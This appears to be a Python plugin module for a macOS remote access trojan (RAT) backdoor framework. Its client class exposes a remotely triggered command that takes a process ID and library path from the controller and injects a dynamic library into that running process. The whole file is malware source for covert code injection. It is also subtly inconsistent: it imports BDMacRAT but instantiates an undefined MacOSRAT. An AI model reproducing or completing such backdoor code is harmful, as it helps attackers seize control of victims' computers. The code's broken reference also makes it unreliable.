import BDModuleDefault
try:
	from BDMacRAT import BDMacRAT

except Exception as exc:
	print("[WARN] Backdoor component BDMacRAT is not supported on this platform")

class ClientMain(BDModuleDefault.ClientMain):

	def __init__(self, handler):
		super().__init__(handler)

		# Create new macOS RAT API instance
		self.rat = MacOSRAT()

	"""
		@method injectdylib
		@brief injects a dynamic library into a running process
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def injectdylib(self, argv):
		try:

			# Get process identifier
			pid = int(self.handler.recv_msg())

			# Get DLL path
			dll = str(self.handler.recv_msg())

			# Attempt injection
			self.rat.injectDylib(pid, dll)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

class ServerMain(BDModuleDefault.ServerMain):

	def __init__(self, handler):
		super().__init__(handler)